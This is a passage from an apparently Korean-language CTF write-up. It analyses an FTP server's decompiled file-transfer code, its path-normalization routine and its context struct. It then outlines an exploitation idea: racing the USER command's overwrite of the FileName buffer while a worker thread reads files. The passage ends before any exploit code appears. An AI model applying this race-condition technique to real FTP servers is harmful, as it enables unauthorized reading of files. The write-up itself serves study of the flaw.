</span></span><span style="display:flex;"><span>          (<span style="color:#66d9ef">__int64</span>)max_size,
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">1LL</span>,
</span></span><span style="display:flex;"><span>          (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>_data_start,
</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34; RETR complete. %zd bytes (%f MBytes) total sent in %f seconds (%f MBytes/s)&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">writelogentry</span>(a1, (<span style="color:#66d9ef">__int64</span>)v1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">close</span>(v5);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x50</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(v1);
</span></span><span style="display:flex;"><span>      v7 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5078</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3C</span>) <span style="color:#f92672">&amp;&amp;</span> v6 )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v7 )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;226 Transfer complete. Closing data connection.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x31uLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> LABEL_9;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_8;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>LABEL_7:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5078</span>) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;426 Connection closed; transfer aborted.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x2AuLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_9;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>LABEL_8:
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>LABEL_9:
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">close</span>(fd);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">44</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_10;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>LABEL_6:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(v1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">goto</span> LABEL_7;
</span></span><span style="display:flex;"><span>LABEL_26:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20600</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;451 Requested action aborted. Local error in processing.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x3AuLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>LABEL_10:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v15 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gnutls_bye</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gnutls_deinit</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">56</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__pthread_unregister_cancel</span>(<span style="color:#f92672">&amp;</span>buf);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_unlock</span>((<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>)a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>쓰레드로 돌아간다.
다른 함수랑 비슷하게 mutex 걸고 간다.
파일을 읽고 datasocket으로 보내준다.</p>
<p>ftp_effective_path 함수는 소스코드를 읽으면서 분석했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ftp_normalize_path</span>(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> path, <span style="color:#66d9ef">size_t</span> npath_len, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> npath)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> p0;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span>          node_len;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>             status <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    pftp_path_node  nodes <span style="color:#f92672">=</span> NULL, newnode;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((path <span style="color:#f92672">==</span> NULL) <span style="color:#f92672">||</span> (npath <span style="color:#f92672">==</span> NULL) <span style="color:#f92672">||</span> (npath_len <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>npath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>path;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>npath;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">--</span>npath_len;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p0 <span style="color:#f92672">=</span> path;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>path <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ((<span style="color:#f92672">*</span>path <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">*</span>path <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">++</span>path;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        node_len <span style="color:#f92672">=</span> path <span style="color:#f92672">-</span> p0;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (node_len <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">/* we have a &#34;this dir&#34; sign: just skip it */</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>(p0, <span style="color:#e6db74">&#34;.&#34;</span>, node_len) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>(p0, <span style="color:#e6db74">&#34;..&#34;</span>, node_len) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">/* we have a &#34;dir-up&#34; sign: unlink and free prev node */</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (nodes)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    newnode <span style="color:#f92672">=</span> nodes<span style="color:#f92672">-&gt;</span>prev;
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">free</span>(nodes);
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (newnode)
</span></span><span style="display:flex;"><span>                        newnode<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>                    nodes <span style="color:#f92672">=</span> newnode;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                newnode <span style="color:#f92672">=</span> <span style="color:#a6e22e">x_malloc</span>(<span style="color:#66d9ef">sizeof</span>(ftp_path_node));
</span></span><span style="display:flex;"><span>                newnode<span style="color:#f92672">-&gt;</span>value <span style="color:#f92672">=</span> p0;
</span></span><span style="display:flex;"><span>                newnode<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">=</span> node_len;
</span></span><span style="display:flex;"><span>                newnode<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>                newnode<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> nodes;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (nodes)
</span></span><span style="display:flex;"><span>                    nodes<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> newnode;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                nodes <span style="color:#f92672">=</span> newnode;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>path <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">++</span>path;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        p0 <span style="color:#f92672">=</span> path;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* return to head */</span>
</span></span><span style="display:flex;"><span>    newnode <span style="color:#f92672">=</span> nodes;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (newnode)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        nodes <span style="color:#f92672">=</span> newnode;
</span></span><span style="display:flex;"><span>        newnode <span style="color:#f92672">=</span> newnode<span style="color:#f92672">-&gt;</span>prev;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (nodes)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (npath_len <span style="color:#f92672">&lt;</span> nodes<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strncpy</span>(npath, nodes<span style="color:#f92672">-&gt;</span>value, nodes<span style="color:#f92672">-&gt;</span>length);
</span></span><span style="display:flex;"><span>        npath <span style="color:#f92672">+=</span> nodes<span style="color:#f92672">-&gt;</span>length;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>npath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">++</span>npath;
</span></span><span style="display:flex;"><span>        npath_len <span style="color:#f92672">-=</span> nodes<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        newnode <span style="color:#f92672">=</span> nodes;
</span></span><span style="display:flex;"><span>        nodes <span style="color:#f92672">=</span> newnode<span style="color:#f92672">-&gt;</span>next;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">free</span>(newnode);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* free the remaining nodes in case of break */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (nodes)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        newnode <span style="color:#f92672">=</span> nodes;
</span></span><span style="display:flex;"><span>        nodes <span style="color:#f92672">=</span> newnode<span style="color:#f92672">-&gt;</span>next;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">free</span>(newnode);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((npath_len <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (status <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>npath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ftp_effective_path</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>root_path, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>current_path,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>file_path, <span style="color:#66d9ef">size_t</span> result_size, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>result)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>    path[PATH_MAX<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>], normalized_path[PATH_MAX];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>     status;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span>  len;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(result, <span style="color:#ae81ff">0</span>, result_size);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (file_path <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>file_path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        status <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftp_normalize_path</span>(file_path, PATH_MAX, normalized_path);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">snprintf</span>(path, PATH_MAX<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#34;%s/%s&#34;</span>, current_path, file_path);
</span></span><span style="display:flex;"><span>        status <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftp_normalize_path</span>(path, PATH_MAX, normalized_path);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(path, PATH_MAX<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#34;%s/%s&#34;</span>, root_path, normalized_path);
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftp_normalize_path</span>(path, result_size, result);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* delete last slash */</span>
</span></span><span style="display:flex;"><span>    len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(result);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (result[len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>            result[len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>기본적으로 root path와 file path를 마지막에 붙여준다.
..이나 .같은 상대주소 처리도 제대로 구현되어있다.</p>
<p>분석하면서 왜 mutex가 엄청 큰지 궁금했는데, 역시 구조체로 구현되어있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FTPCONTEXT {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_mutex_t</span>     MTLock;
</span></span><span style="display:flex;"><span>    SOCKET              ControlSocket;
</span></span><span style="display:flex;"><span>    SOCKET              DataSocket;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_t</span>           WorkerThreadId;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * WorkerThreadValid is output of pthread_create
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * therefore zero is VALID indicator and -1 is invalid.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 WorkerThreadValid;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 WorkerThreadAbort;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">in_addr_t</span>           ServerIPv4;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">in_addr_t</span>           ClientIPv4;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">in_addr_t</span>           DataIPv4;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">in_port_t</span>           DataPort;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 File;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 Mode;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 Access;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 SessionID;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>                 DataProtectionLevel;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">off_t</span>               RestPoint;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span>            BlockSize;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>                CurrentDir[PATH_MAX];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>                RootDir[PATH_MAX];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>                RnFrom[PATH_MAX];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span>                FileName[<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>PATH_MAX];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">gnutls_session_t</span>    TLS_session;
</span></span><span style="display:flex;"><span>    SESSION_STATS       Stats;
</span></span><span style="display:flex;"><span>} FTPCONTEXT, <span style="color:#f92672">*</span>PFTPCONTEXT;
</span></span></code></pre></div><p>함수가 호출되면서 FTPCONTEXT가 첫번째 인자로 들어가고 두번째 인자는 명령어의 operand가 들어간다.
File이나, Access, Mode같은 필드들이 있었다.</p>
<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ftpUSER</span>(PFTPCONTEXT context, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>params)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( params <span style="color:#f92672">==</span> NULL )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendstring</span>(context, error501);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    context<span style="color:#f92672">-&gt;</span>Access <span style="color:#f92672">=</span> FTP_ACCESS_NOT_LOGGED_IN;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>(context, <span style="color:#e6db74">&#34; USER: &#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)params);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(context<span style="color:#f92672">-&gt;</span>FileName, <span style="color:#66d9ef">sizeof</span>(context<span style="color:#f92672">-&gt;</span>FileName), <span style="color:#e6db74">&#34;331 User %s OK. Password required</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, params);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sendstring</span>(context, context<span style="color:#f92672">-&gt;</span>FileName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Save login name to FileName for the next PASS command */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(context<span style="color:#f92672">-&gt;</span>FileName, params);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ftpUSER에서 FileName이 덮힌다.
ftp_effective_path에서</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">snprintf</span>(path, PATH_MAX<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>, <span style="color:#e6db74">&#34;%s/%s&#34;</span>, root_path, normalized_path);
</span></span></code></pre></div><p>위와 같이 root_path와 normalized_path를 붙이고 ..과 .은 독립적으로 처리가 되기 때문에 Path Traversal은 불가능하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#a6e22e">ftp_effective_path</span>(context<span style="color:#f92672">-&gt;</span>RootDir, context<span style="color:#f92672">-&gt;</span>CurrentDir, params, <span style="color:#66d9ef">sizeof</span>(context<span style="color:#f92672">-&gt;</span>FileName), context<span style="color:#f92672">-&gt;</span>FileName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">stat</span>(context<span style="color:#f92672">-&gt;</span>FileName, <span style="color:#f92672">&amp;</span>filestats) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">S_ISDIR</span>(filestats.st_mode) )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sendstring</span>(context, interm150);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">writelogentry</span>(context, <span style="color:#e6db74">&#34; MLSD-LIST &#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)params);
</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>WorkerThreadAbort <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>context<span style="color:#f92672">-&gt;</span>MTLock);
</span></span></code></pre></div><p>ftpMLSD 함수의 일부분을 보면, ftp_effective_path를 호출하고 context-&gt;FileName을 체크하는 것을 알 수 있다.
이때 root_path가 /server/data라서 거기에 있는 hello.txt를 읽고, mutex가 unlock될때 읽으면 된다고 생각했다.
그때 mutex를 잘못알고 있어서, 저렇게 생각했었는데, 나중에 알아보니 굳이 mutex unlock 되고 바꿀 필요가 없었다.
그때는 왜 lock 되어있는데 값이 바뀌는지 궁금했지만, 그냥 되길래 익스플로잇 코드를 짰었다.</p>
